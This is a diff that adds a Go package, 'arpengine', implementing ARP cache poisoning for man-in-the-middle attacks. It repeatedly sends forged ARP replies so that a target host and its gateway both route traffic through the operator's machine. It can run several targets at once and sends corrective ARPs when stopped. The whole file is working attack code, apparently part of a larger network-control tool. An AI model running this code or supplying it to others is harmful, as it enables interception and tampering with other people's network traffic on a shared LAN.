@@ -1,0 +1,156 @@
+// Package arpengine sends unsolicited ARP replies on a cadence to perform
+// MITM-style ARP poisoning, and emits corrective ARPs on stop.
+package arpengine
+
+import (
+	"context"
+	"fmt"
+	"net"
+	"sync"
+	"time"
+
+	"github.com/google/gopacket/pcap"
+)
+
+// Target is one host being poisoned. The same struct is used by
+// policycompiler (which imports this package for the type) so the public
+// field names match the compiler's call sites.
+type Target struct {
+	MAC   net.HardwareAddr
+	IP    net.IP
+	GwMAC net.HardwareAddr
+	GwIP  net.IP
+}
+
+// ActivePoison is the public view of an in-flight poison.
+type ActivePoison struct {
+	Target  Target
+	Started time.Time
+}
+
+// Engine manages the set of in-flight ARP poisons.
+type Engine struct {
+	iface   string
+	opMAC   net.HardwareAddr
+	cadence time.Duration
+	mu      sync.Mutex
+	active  map[string]*runner // key: TargetMAC.String()
+}
+
+type runner struct {
+	target  Target
+	cancel  context.CancelFunc
+	started time.Time
+}
+
+// New returns an engine bound to a specific interface and operator MAC.
+// cadence=0 selects the default of 1 s.
+func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
+	if cadence == 0 {
+		cadence = time.Second
+	}
+	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, active: map[string]*runner{}}
+}
+
+// Start begins poisoning t. Idempotent: starting an already-active target
+// is a no-op (returns nil without restarting).
+func (e *Engine) Start(t Target) error {
+	e.mu.Lock()
+	defer e.mu.Unlock()
+	key := t.MAC.String()
+	if _, exists := e.active[key]; exists {
+		return nil
+	}
+	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
+	if err != nil {
+		return fmt.Errorf("open %s: %w", e.iface, err)
+	}
+	ctx, cancel := context.WithCancel(context.Background())
+	r := &runner{target: t, cancel: cancel, started: time.Now()}
+	e.active[key] = r
+	go e.loop(ctx, handle, t)
+	return nil
+}
+
+func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target) {
+	defer handle.Close()
+	tick := time.NewTicker(e.cadence)
+	defer tick.Stop()
+	send := func() {
+		// Poison target's cache: "gateway IP is at op MAC".
+		if f, err := buildARPReply(e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
+			_ = handle.WritePacketData(f)
+		}
+		// Poison gateway's cache: "target IP is at op MAC".
+		if f, err := buildARPReply(e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
+			_ = handle.WritePacketData(f)
+		}
+	}
+	send() // immediate first emission
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-tick.C:
+			send()
+		}
+	}
+}
+
+// Stop halts poisoning of the named target and emits corrective ARPs
+// asserting the real (gw,target) mappings. Blocks for up to 3*cadence to
+// give caches time to recover. No-op for unknown targets.
+func (e *Engine) Stop(t Target) error {
+	e.mu.Lock()
+	r, ok := e.active[t.MAC.String()]
+	if !ok {
+		e.mu.Unlock()
+		return nil
+	}
+	delete(e.active, t.MAC.String())
+	e.mu.Unlock()
+	r.cancel()
+
+	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
+	if err != nil {
+		return fmt.Errorf("open %s for corrective: %w", e.iface, err)
+	}
+	defer handle.Close()
+	// Real mapping: gateway IP is at gateway MAC.
+	if f, err := buildARPReply(t.GwMAC, t.GwIP, t.MAC, t.IP); err == nil {
+		for i := 0; i < 3; i++ {
+			_ = handle.WritePacketData(f)
+			time.Sleep(e.cadence)
+		}
+	}
+	// Real mapping: target IP is at target MAC, told to gateway.
+	if f, err := buildARPReply(t.MAC, t.IP, t.GwMAC, t.GwIP); err == nil {
+		_ = handle.WritePacketData(f)
+	}
+	return nil
+}
+
+// StopAll halts every active poison. Errors are aggregated.
+func (e *Engine) StopAll() error {
+	e.mu.Lock()
+	targets := make([]Target, 0, len(e.active))
+	for _, r := range e.active {
+		targets = append(targets, r.target)
+	}
+	e.mu.Unlock()
+	for _, t := range targets {
+		_ = e.Stop(t)
+	}
+	return nil
+}
+
+// Active returns a snapshot of in-flight poisons.
+func (e *Engine) Active() []ActivePoison {
+	e.mu.Lock()
+	defer e.mu.Unlock()
+	out := make([]ActivePoison, 0, len(e.active))
+	for _, r := range e.active {
+		out = append(out, ActivePoison{Target: r.target, Started: r.started})
+	}
+	return out
+}
